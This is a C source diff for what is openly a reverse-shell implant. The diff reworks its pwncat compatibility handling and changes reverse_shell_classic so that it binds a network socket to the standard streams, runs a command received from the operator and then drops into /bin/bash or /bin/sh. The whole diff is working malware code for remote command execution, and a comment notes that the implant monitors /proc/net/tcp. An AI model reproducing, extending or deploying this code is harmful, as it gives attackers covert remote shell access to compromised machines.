@@ -48,13 +48,17 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
         while (read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1) > 0) {
             // Hacky pwncat compatibility
             if (firstCommand && strncmp(PWNCAT_INIT, input, strlen(PWNCAT_INIT)) == 0) {
-                handle_pwncat(sock, input);
+                // Cut the command at the newline
+                char *enter = strstr(input, "\n");
+                *enter = 0x00;
+                // Break into a reverse shell and execute the command we just received
+                reverse_shell_classic(sock, "/bin/bash", input);
                 break;
             }
             // "!shell" drops you into a more "usable" shell
             if (strncmp("!shell", input, strlen("!shell")) == 0) {
                 // Call will create a new process that uses `sock` as a reverse shell.
-                reverse_shell_classic(sock, "/bin/sh");
+                reverse_shell_classic(sock, "/bin/sh", NULL);
                 // Our parent process needs to break out of this while loop to free up `sock`.
                 // This will cause the parent process to begin monitoring /proc/net/tcp again
                 break;
@@ -65,21 +69,6 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
         }
         close(sock);
     }
-}
-
-void handle_pwncat(int sock, char *input) {
-    // Pwncat will send out two delimeters, which we need to return on separate lines.
-    //" echo; echo FRWVJ40vSa; which hostname; echo 1N0YVOVYai"
-    char first[20];
-    char second[20];
-    // Read the markers (needles?) provided by pwncat
-    sscanf(input, "  echo; echo %[^;]; %*[^;]; echo %s\n", first, second);
-    char return_val[50];
-    // return them on separate lines. The second value is the would-be return value of `which hostname`
-    snprintf(return_val, sizeof(return_val), "%s\nAAAA\n%s", first, second);
-    send(sock, return_val, strlen(return_val), 0);
-    // Pwncat seems to work better with bash.
-    reverse_shell_classic(sock, "/bin/bash");
 }
 
 void handle_cmd(int sock, char *input) {
@@ -95,14 +84,28 @@ void handle_cmd(int sock, char *input) {
     pclose(fp);
 }
 
-void reverse_shell_classic(int sock, char *shell) {
+void reverse_shell_classic(int sock, char *shell, char *cmd) {
+    // Construct a string that looks like "cmd; shell"
+    char cmd_shell[276] = "";
+    if (cmd && strlen(cmd) + strlen(shell) + 1 < sizeof(cmd_shell)) {
+        strncpy(cmd_shell, cmd, strlen(cmd));
+        strcat(cmd_shell, ";");
+        strcat(cmd_shell, shell);
+    } else {
+        // If we didn't receive a command to execute, just launch the shell
+        strncpy(cmd_shell, shell, strlen(shell));
+    }
+
+    // Create a fork s.t. one process will be replaced by a shell,
+    // while the other one can return to the reconnect loop
     int pid = fork();
     if (pid != 0) {
         dup2(sock, 0);
         dup2(sock, 1);
         dup2(sock, 2);
-        char *args[] = {shell, NULL};
-        execve(args[0], args, 0);
+        // execute the command, then drop in to a reverse shell
+        char *args[] = {shell, "-c", cmd_shell, NULL};
+        execv(args[0], args);
     }
 }
 
